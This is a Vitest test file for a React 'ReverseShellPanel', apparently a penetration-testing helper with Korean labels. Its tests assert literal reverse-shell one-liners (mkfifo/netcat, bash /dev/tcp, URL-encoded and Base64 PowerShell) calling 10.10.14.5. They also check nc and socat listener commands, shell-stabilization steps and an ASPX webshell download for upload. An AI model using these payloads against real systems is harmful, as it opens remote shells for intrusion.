// @vitest-environment jsdom
import React from "react";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, expect, it, vi } from "vitest";
import ReverseShellPanel from "./ReverseShellPanel";

afterEach(cleanup);

it("builds the payload from LHOST/LPORT and defaults to the mkfifo netcat variant", () => {
  render(<ReverseShellPanel onStartListener={vi.fn()} />);
  fireEvent.change(screen.getByLabelText("LHOST"), { target: { value: "10.10.14.5" } });
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "443" } });

  expect(screen.getByText(
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f",
  )).toBeTruthy();
});

it("switches payload kind and URL-encodes it for use as a GET parameter", () => {
  render(<ReverseShellPanel onStartListener={vi.fn()} />);
  fireEvent.change(screen.getByLabelText("LHOST"), { target: { value: "10.10.14.5" } });
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "443" } });
  fireEvent.change(screen.getByLabelText("쉘 종류"), { target: { value: "bash" } });
  fireEvent.click(screen.getByLabelText(/URL 인코딩/));

  expect(screen.getByText(encodeURIComponent(
    "bash -i >& /dev/tcp/10.10.14.5/443 0>&1",
  ))).toBeTruthy();
});

it("starts an nc listener on the typed port by default", () => {
  const onStartListener = vi.fn();
  render(<ReverseShellPanel onStartListener={onStartListener} />);
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "9001" } });
  fireEvent.click(screen.getByText("리스너 준비 (nc -lvnp)"));
  expect(onStartListener).toHaveBeenCalledWith("nc -lvnp 9001");
});

it("switches to a socat listener that survives a dropped connection", () => {
  const onStartListener = vi.fn();
  render(<ReverseShellPanel onStartListener={onStartListener} />);
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "9001" } });
  fireEvent.change(screen.getByLabelText("리스너 종류"), { target: { value: "socat" } });
  fireEvent.click(screen.getByText("리스너 준비 (socat)"));
  expect(onStartListener).toHaveBeenCalledWith("socat TCP-LISTEN:9001,reuseaddr,fork -");
});

it("shows the -enc checkbox only for the PowerShell kind and encodes the payload when checked", () => {
  render(<ReverseShellPanel onStartListener={vi.fn()} />);
  fireEvent.change(screen.getByLabelText("LHOST"), { target: { value: "10.10.14.5" } });
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "4444" } });

  expect(screen.queryByLabelText(/-enc\(Base64\)/)).toBeNull();

  fireEvent.change(screen.getByLabelText("쉘 종류"), { target: { value: "powershell" } });
  expect(screen.getByText(/powershell -nop -c "/)).toBeTruthy();

  fireEvent.click(screen.getByLabelText(/-enc\(Base64\)/));
  const rendered = screen.getByText(/^powershell -nop -enc /).textContent || "";
  expect(rendered).not.toContain('"');
  const binary = atob(rendered.replace("powershell -nop -enc ", ""));
  let decoded = "";
  for (let i = 0; i < binary.length; i += 2) {
    decoded += String.fromCharCode(binary.charCodeAt(i) | (binary.charCodeAt(i + 1) << 8));
  }
  expect(decoded).toContain("10.10.14.5");
  expect(decoded).toContain("4444");
});

it("includes the pty.spawn shell-stabilization steps", () => {
  render(<ReverseShellPanel onStartListener={vi.fn()} />);
  expect(screen.getByText(/pty\.spawn/)).toBeTruthy();
  expect(screen.getByText(/stty raw -echo/)).toBeTruthy();
});

it("downloads the selected webshell file once LHOST/LPORT are filled in", () => {
  const createObjectURL = vi.fn((_blob: Blob) => "blob:mock");
  const revokeObjectURL = vi.fn();
  vi.stubGlobal("URL", { ...URL, createObjectURL, revokeObjectURL });
  render(<ReverseShellPanel onStartListener={vi.fn()} />);
  const button = screen.getByText("업로드용 파일로 다운로드") as HTMLButtonElement;
  expect(button.disabled).toBe(true);

  fireEvent.change(screen.getByLabelText("LHOST"), { target: { value: "10.10.14.5" } });
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "1234" } });
  fireEvent.change(screen.getByLabelText("웹셸 파일 종류"), { target: { value: "aspx" } });
  expect(button.disabled).toBe(false);
  fireEvent.click(button);

  expect(createObjectURL).toHaveBeenCalledTimes(1);
  const blob = createObjectURL.mock.calls[0]?.[0] as Blob;
  expect(blob.type).toBe("text/plain");
  expect(revokeObjectURL).toHaveBeenCalledWith("blob:mock");
  vi.unstubAllGlobals();
});
